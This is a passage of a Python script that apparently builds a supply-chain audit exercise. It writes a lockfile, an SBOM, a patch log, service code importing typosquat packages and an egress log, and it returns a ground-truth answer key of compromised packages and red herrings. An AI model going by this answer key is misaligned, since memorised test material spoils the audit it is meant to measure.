    _w(os.path.join(mirror, "metrics_core-%s" % _METRICSCORE_GOOD_VERSION,
                    "metrics_core", "__init__.py"), _METRICSCORE_GOOD_INIT)

    # ---- the service lockfile (declares the intended, trusted dependency set) ----
    _w(os.path.join(app, "service", "requirements.lock"), _lockfile())

    # ---- CycloneDX SBOM (independent signal; carries the oldcrypto CVE note) ----
    _w(os.path.join(app, "service", "sbom.cdx.json"), _sbom())

    # ---- documented local patch log (makes RH1 defensible) ----
    _w(os.path.join(app, "service", "PATCHES.md"),
       "# Local patches\n\n"
       "- **localpatch-ui 2.0.0** (2026-08-11): local hotfix to `render()` guarding a\n"
       "  `None` input. Approved by the platform team; intentionally diverges from the\n"
       "  published wheel, so its dist-info RECORD hash will not match on disk. Benign.\n")

    # ---- first-party service source (imports across the tree; motivates the audit) ----
    _w(os.path.join(app, "service", "README.md"),
       "# checkout-service\n\nImports geoindex, metricslib, corp_telemetry, slugify and the\n"
       "shim in src/svc. `debug-shell` is an OPTIONAL loopback debugger, off unless\n"
       "DEBUG_SHELL_ENABLE=1 (never set in prod).\n")
    _w(os.path.join(app, "service", "src", "svc", "__init__.py"), "")
    # main imports across the compromised set, so a remediation that restores/repins the
    # right builds keeps the service working, but one that removes or breaks a needed
    # dependency (or leaves a typosquat import dangling) fails the service check.
    _w(os.path.join(app, "service", "src", "svc", "main.py"),
       "import geoindex\n"
       "import metricslib\n"
       "import corp_telemetry\n"
       "import metrics_core\n"
       "import logkit\n"
       "from . import shim, net\n\n\n"
       "def run():\n"
       "    logkit.write('boot')\n"
       "    metrics_core.emit('svc.run', 1)\n"
       "    _ = metricslib.summarize([1, 2, 3])\n"
       "    _ = corp_telemetry.send('svc.run', 1)\n"
       "    net.check()\n"
       "    return geoindex.encode(37.42, -122.08, 9)\n")
    # the shim pulls in the sluglfy typosquat
    _w(os.path.join(app, "service", "src", "svc", "shim.py"),
       "# convenience re-exports\nimport sluglfy as _slug\n\n\ndef norm(s):\n    return _slug.slugify(s)\n")
    # the net module pulls in the urllib33 typosquat
    _w(os.path.join(app, "service", "src", "svc", "net.py"),
       "import urllib33\n\n\ndef check():\n    urllib33.PoolManager()\n    return True\n")
    _w(os.path.join(app, "service", "logs", "egress.log"),
       "startup: importing service dependencies\n"
       "resolver: multiple outbound name lookups from pid 1 to non-mirror hosts\n"
       "resolver: connection attempts to several non-first-party endpoints blocked by egress policy\n"
       "note: at least one connection was attempted before any import (interpreter startup)\n")

    gt = ground_truth(sp, mirror)
    print("built supply-chain-audit:",
          "%d installed dists" % _count_dists(sp),
          "| compromised", len(COMPROMISED), "| red-herrings", len(RED_HERRINGS))
    return gt


def _count_dists(sp):
    return len([d for d in os.listdir(sp) if d.endswith(".dist-info")])


def _lockfile():
    # declares the intended set: filler + geoindex + metricslib + corp-telemetry==1.4.2
    # (internal) + buildtools-ext + slugify + the red-herrings. Does NOT list sluglfy, and
    # pins corp-telemetry to the INTERNAL 1.4.2 -- the two cross-reference signals.
    lines = ["# requirements.lock -- resolved, trusted dependency set (internal index)"]
    declared = [(n, v) for n, (v, _) in sorted(_filler().items())]
    declared += [("geoindex", "1.2.0"), ("metricslib", "0.7.3"),
                 ("corp-telemetry", _CORPTEL_GOOD_VERSION + "  # internal index only"),
                 ("metrics-core", _METRICSCORE_GOOD_VERSION + "  # internal index only"),
                 ("buildtools-ext", "0.3.1"), ("logkit", "2.1.0"), ("svc-cli", "0.6.0"),
                 ("localpatch-ui", "2.0.0"), ("fastserialize", "1.2.0"), ("oldcrypto", "1.0.3"),
                 ("debug-shell", "0.5.0"), ("crashreporter", "1.1.0"), ("vendored-min", "0.2.0")]
    for n, v in sorted(declared):
        lines.append("%s==%s" % (n, v))
    return "\n".join(lines) + "\n"


def _sbom():
    comps = [{"type": "library", "name": "oldcrypto", "version": "1.0.3",
              "properties": [{"name": "cve", "value": "CVE-2021-00000 (MD5 usage; upgrade advised)"},
                             {"name": "note", "value": "known-vulnerable but not tampered"}]}]
    for n, (v, _) in sorted(_filler().items()):
        comps.append({"type": "library", "name": n, "version": v})
    return json.dumps({"bomFormat": "CycloneDX", "specVersion": "1.5", "components": comps}, indent=2)


# ------------------------------------------------------------------------------ ground truth
def ground_truth(sp=None, mirror=None):
    sp = sp or _paths(None)[0]
    comp = {}
    for name, meta in COMPROMISED.items():
        d = dict(meta)
        d["package"] = name
        comp[name] = d
    return {
        "compromised": comp,                       # name -> {vector,trigger,cwe,owasp,indicator}
        "compromised_names": sorted(comp),
        "red_herrings": sorted(RED_HERRINGS),
        "geoindex_marker": _GEOINDEX_MARKER,
        "geoindex_clean_core_sha256": hashlib.sha256(_GEOINDEX_CLEAN_CORE.encode()).hexdigest(),
        "corptel_good_version": _CORPTEL_GOOD_VERSION,
        "buildtools_pth": "buildtools_ext_autoload.pth",
        "sp": sp,
    }


if __name__ == "__main__":
    build()
